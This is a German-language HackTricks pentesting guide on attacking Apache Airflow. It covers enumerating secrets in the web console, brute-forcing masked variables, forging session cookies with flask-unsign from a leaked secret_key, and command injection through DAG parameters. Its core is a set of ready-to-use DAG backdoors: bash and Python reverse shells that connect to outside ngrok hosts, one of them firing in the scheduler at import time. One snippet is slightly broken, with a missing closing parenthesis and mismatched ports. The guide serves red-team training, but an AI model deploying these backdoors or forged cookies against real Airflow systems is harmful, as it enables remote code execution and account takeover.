# Apache Airflow Sicherheit

<details>

{% hint style="success" %}
Lernen Sie und √ºben Sie AWS-Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Lernen Sie und √ºben Sie GCP-Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterst√ºtzen Sie HackTricks</summary>

* √úberpr√ºfen Sie die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Github-Repositories senden.

</details>
{% endhint %}

## Grundlegende Informationen

[**Apache Airflow**](https://airflow.apache.org) dient als Plattform zur **Orchestrierung und Planung von Datenpipelines oder Workflows**. Der Begriff "Orchestrierung" im Kontext von Datenpipelines bezeichnet den Prozess des Anordnens, Koordinierens und Verwaltens komplexer Datenworkflows, die aus verschiedenen Quellen stammen. Der Hauptzweck dieser orchestrierten Datenpipelines besteht darin, verarbeitete und nutzbare Datens√§tze bereitzustellen. Diese Datens√§tze werden von einer Vielzahl von Anwendungen umfassend genutzt, einschlie√ülich, aber nicht beschr√§nkt auf Business-Intelligence-Tools, Datenwissenschaft und Machine-Learning-Modelle, die alle grundlegend f√ºr die Funktionsweise von Big-Data-Anwendungen sind.

Grunds√§tzlich erm√∂glicht Ihnen Apache Airflow, **die Ausf√ºhrung von Code zu planen, wenn etwas** (Ereignis, Cron) **passiert**.

## Lokales Labor

### Docker-Compose

Sie k√∂nnen die **Docker-Compose-Konfigurationsdatei von** [**https://raw.githubusercontent.com/apache/airflow/main/docs/apache-airflow/start/docker-compose.yaml**](https://raw.githubusercontent.com/apache/airflow/main/docs/apache-airflow/start/docker-compose.yaml) verwenden, um eine vollst√§ndige Apache Airflow Docker-Umgebung zu starten. (Wenn Sie auf MacOS sind, stellen Sie sicher, dass Sie der Docker-VM mindestens 6 GB RAM zuweisen).

### Minikube

Eine einfache M√∂glichkeit, **Apache Airflow auszuf√ºhren**, besteht darin, es **mit Minikube auszuf√ºhren**:
```bash
helm repo add airflow-stable https://airflow-helm.github.io/charts
helm repo update
helm install airflow-release airflow-stable/airflow
# Some information about how to aceess the web console will appear after this command

# Use this command to delete it
helm delete airflow-release
```
## Airflow Konfiguration

Airflow k√∂nnte **sensible Informationen** in seiner Konfiguration speichern oder es k√∂nnen schwache Konfigurationen vorhanden sein:

{% content-ref url="airflow-configuration.md" %}
[airflow-configuration.md](airflow-configuration.md)
{% endcontent-ref %}

## Airflow RBAC

Bevor Sie Airflow angreifen, sollten Sie verstehen, **wie Berechtigungen funktionieren**:

{% content-ref url="airflow-rbac.md" %}
[airflow-rbac.md](airflow-rbac.md)
{% endcontent-ref %}

## Angriffe

### Web-Konsolen-Auflistung

Wenn Sie **Zugriff auf die Web-Konsole** haben, k√∂nnten Sie auf einige oder alle der folgenden Informationen zugreifen k√∂nnen:

* **Variablen** (Benutzerdefinierte sensible Informationen k√∂nnten hier gespeichert sein)
* **Verbindungen** (Benutzerdefinierte sensible Informationen k√∂nnten hier gespeichert sein)
* Greifen Sie darauf zu unter `http://<airflow>/connection/list/`
* [**Konfiguration**](./#airflow-configuration) (Sensible Informationen wie der **`secret_key`** und Passw√∂rter k√∂nnten hier gespeichert sein)
* Liste der **Benutzer & Rollen**
* **Code jeder DAG** (der interessante Informationen enthalten k√∂nnte)

### Abrufen von Variablenwerten

Variablen k√∂nnen in Airflow gespeichert werden, damit die **DAGs** auf ihre Werte zugreifen k√∂nnen. Es ist √§hnlich wie bei Geheimnissen anderer Plattformen. Wenn Sie **ausreichende Berechtigungen** haben, k√∂nnen Sie auf sie im GUI unter `http://<airflow>/variable/list/` zugreifen.\
Standardm√§√üig zeigt Airflow den Wert der Variablen im GUI an, jedoch ist es gem√§√ü [**diesem**](https://marclamberti.com/blog/variables-with-apache-airflow/) m√∂glich, eine **Liste von Variablen** festzulegen, deren **Wert** im **GUI** als **Sternchen** angezeigt wird.

![](<../../.gitbook/assets/image (164).png>)

Diese **Werte** k√∂nnen jedoch immer noch √ºber **CLI** (Zugriff auf die DB erforderlich), **beliebige DAG**-Ausf√ºhrung, **API**-Zugriff auf den Variablen-Endpunkt (die API muss aktiviert sein) und **sogar das GUI selbst!** **abgerufen** werden. Um auf diese Werte im GUI zuzugreifen, w√§hlen Sie einfach die Variablen aus, auf die Sie zugreifen m√∂chten, und klicken Sie auf Aktionen -> Export.\
Ein weiterer Weg ist, eine **Brute-Force** auf den **versteckten Wert** durchzuf√ºhren, indem Sie ihn mit der **Suchfilterung** suchen, bis Sie ihn erhalten:

![](<../../.gitbook/assets/image (152).png>)

### Privilege Escalation

Wenn die Konfiguration **`expose_config`** auf **True** gesetzt ist, k√∂nnen ab der **Rolle Benutzer** und h√∂her die **Konfiguration im Web** **gelesen** werden. In dieser Konfiguration erscheint der **`secret_key`**, was bedeutet, dass jeder Benutzer mit diesem g√ºltigen Schl√ºssel seinen eigenen signierten Cookie erstellen kann, um ein beliebiges anderes Benutzerkonto zu **imitieren**.
```bash
flask-unsign --sign --secret '<secret_key>' --cookie "{'_fresh': True, '_id': '12345581593cf26619776d0a1e430c412171f4d12a58d30bef3b2dd379fc8b3715f2bd526eb00497fcad5e270370d269289b65720f5b30a39e5598dad6412345', '_permanent': True, 'csrf_token': '09dd9e7212e6874b104aad957bbf8072616b8fbc', 'dag_status_filter': 'all', 'locale': 'en', 'user_id': '1'}"
```
### DAG Backdoor (RCE in Airflow worker)

Wenn Sie **Schreibzugriff** auf den Ort haben, an dem die **DAGs gespeichert sind**, k√∂nnen Sie einfach **einen erstellen**, der Ihnen eine **umgekehrte Shell sendet**.\
Beachten Sie, dass diese umgekehrte Shell innerhalb eines **Airflow-Worker-Containers** ausgef√ºhrt wird:
```python
import pendulum
from airflow import DAG
from airflow.operators.bash import BashOperator

with DAG(
dag_id='rev_shell_bash',
schedule_interval='0 0 * * *',
start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
run = BashOperator(
task_id='run',
bash_command='bash -i >& /dev/tcp/8.tcp.ngrok.io/11433  0>&1',
)
```

```python
import pendulum, socket, os, pty
from airflow import DAG
from airflow.operators.python import PythonOperator

def rs(rhost, port):
s = socket.socket()
s.connect((rhost, port))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")

with DAG(
dag_id='rev_shell_python',
schedule_interval='0 0 * * *',
start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
run = PythonOperator(
task_id='rs_python',
python_callable=rs,
op_kwargs={"rhost":"8.tcp.ngrok.io", "port": 11433}
)
```
### DAG Backdoor (RCE in Airflow Scheduler)

Wenn Sie etwas so einstellen, dass es **im Stamm des Codes ausgef√ºhrt wird**, wird es zum Zeitpunkt des Verfassens dieses Textes **vom Scheduler ausgef√ºhrt**, ein paar Sekunden nachdem es im Ordner des DAG platziert wurde.
```python
import pendulum, socket, os, pty
from airflow import DAG
from airflow.operators.python import PythonOperator

def rs(rhost, port):
s = socket.socket()
s.connect((rhost, port))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")

rs("2.tcp.ngrok.io", 14403)

with DAG(
dag_id='rev_shell_python2',
schedule_interval='0 0 * * *',
start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
run = PythonOperator(
task_id='rs_python2',
python_callable=rs,
op_kwargs={"rhost":"2.tcp.ngrok.io", "port": 144}
```
### DAG-Erstellung

Wenn es Ihnen gelingt, **eine Maschine innerhalb des DAG-Clusters zu kompromittieren**, k√∂nnen Sie neue **DAG-Skripte** im `dags/`-Ordner erstellen, und sie werden in den anderen Maschinen innerhalb des DAG-Clusters **repliziert**.

### DAG-Codeinjektion

Wenn Sie einen DAG aus der GUI ausf√ºhren, k√∂nnen Sie **Argumente √ºbergeben**.\
Daher k√∂nnte der DAG **anf√§llig f√ºr Befehlsinjektion sein**, wenn er nicht ordnungsgem√§√ü codiert ist.\
Das ist das, was bei diesem CVE passiert ist: [https://www.exploit-db.com/exploits/49927](https://www.exploit-db.com/exploits/49927)

Alles, was Sie wissen m√ºssen, um **nach Befehlsinjektionen in DAGs zu suchen**, ist, dass **Parameter** mit dem Code **`dag_run.conf.get("param_name")`** **abgerufen** werden.

Dar√ºber hinaus k√∂nnte dieselbe Schwachstelle bei **Variablen** auftreten (beachten Sie, dass Sie mit ausreichenden Berechtigungen den **Wert der Variablen in der GUI steuern k√∂nnten**). Variablen werden **mit** zugegriffen:
```python
from airflow.models import Variable
[...]
foo = Variable.get("foo")
```
Wenn sie zum Beispiel innerhalb eines Bash-Befehls verwendet werden, k√∂nnten Sie eine Befehlsinjektion durchf√ºhren.

<details>

{% hint style="success" %}
Lernen Sie & √ºben Sie AWS-Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Lernen Sie & √ºben Sie GCP-Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterst√ºtzen Sie HackTricks</summary>

* √úberpr√ºfen Sie die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Github-Repositories einreichen.

</details>
{% endhint %}
